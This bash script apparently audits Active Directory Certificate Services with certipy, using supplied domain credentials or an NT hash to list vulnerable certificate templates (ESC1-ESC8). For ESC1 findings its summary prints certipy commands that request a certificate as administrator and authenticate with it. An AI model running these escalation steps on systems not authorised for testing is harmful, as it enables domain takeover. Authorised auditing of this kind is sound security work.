#!/usr/bin/env bash
#
# certipy-adcs.sh
#
# Check Active Directory Certificate Services for the common misconfigurations
# (ESC1-ESC8) with certipy, and print the exploit command for anything it flags
# vulnerable. Needs domain credentials.
#
# Usage:
#   ./certipy-adcs.sh 10.0.0.1 -d corp.local -u jdoe -p 'Passw0rd!'
#   ./certipy-adcs.sh 10.0.0.1 -d corp.local -u jdoe -H <nthash> --out ./adcs
#
set -uo pipefail

DOMAIN=""
USER=""
PASS=""
NTHASH=""
OUT=""

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

certipy_bin() {
  for b in certipy certipy-ad; do have "$b" && { echo "$b"; return 0; }; done
  return 1
}

DC=""
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)   usage 0 ;;
    -d|--domain) shift; DOMAIN="$1" ;;
    -u|--user)   shift; USER="$1" ;;
    -p|--pass)   shift; PASS="$1" ;;
    -H|--hash)   shift; NTHASH="$1" ;;
    --out|-o)    shift; [ $# -gt 0 ] || die "--out needs a path"; OUT="$1" ;;
    --out=*)     OUT="${1#*=}" ;;
    -*)          die "Unknown option: $1 (try --help)" ;;
    *)           [ -z "$DC" ] || die "Only one DC allowed."; DC="$1" ;;
  esac
  shift
done
[ -n "$DC" ]     || { echo "No DC/CA IP given." >&2; usage 2; }
[ -n "$DOMAIN" ] || { echo "No domain (-d) given." >&2; usage 2; }
[ -n "$USER" ]   || { echo "No user (-u) given." >&2; usage 2; }
[ -n "$PASS" ] || [ -n "$NTHASH" ] || { echo "Need -p or -H." >&2; usage 2; }

CP=$(certipy_bin) || die "certipy not found (pipx install certipy-ad / apt install certipy)."
slug=$(printf '%s' "$DOMAIN" | tr -cd 'a-zA-Z0-9._-')
[ -n "$OUT" ] || OUT="./adcs_${slug}"
mkdir -p "$OUT"

# Auth flag.
if [ -n "$NTHASH" ]; then authflag=(-hashes ":$NTHASH"); else authflag=(-p "$PASS"); fi

echo ">> certipy find (vulnerable templates) against $DC..."
( cd "$OUT" && "$CP" find -u "${USER}@${DOMAIN}" "${authflag[@]}" -dc-ip "$DC" -vulnerable -stdout ) \
  | tee "$OUT/certipy-find.txt"

echo
echo "================ SUMMARY ================"
if grep -qiE 'ESC[0-9]' "$OUT/certipy-find.txt" 2>/dev/null; then
  echo "Potentially vulnerable templates:"
  grep -iE 'ESC[0-9]|Template Name' "$OUT/certipy-find.txt" | sed 's/^/   /'
  echo
  echo "If ESC1 (enrollee supplies subject), request a cert as a target admin:"
  echo "   $CP req -u '${USER}@${DOMAIN}' ${NTHASH:+-hashes :$NTHASH}${PASS:+-p '<pass>'} \\"
  echo "     -dc-ip $DC -ca <CA-NAME> -template <TEMPLATE> -upn administrator@$DOMAIN"
  echo "Then authenticate with the PFX:"
  echo "   $CP auth -pfx administrator.pfx -dc-ip $DC"
else
  echo "No ESC findings reported (see $OUT/certipy-find.txt for the full output)."
fi
echo "Full output: $OUT/certipy-find.txt"
echo "========================================"
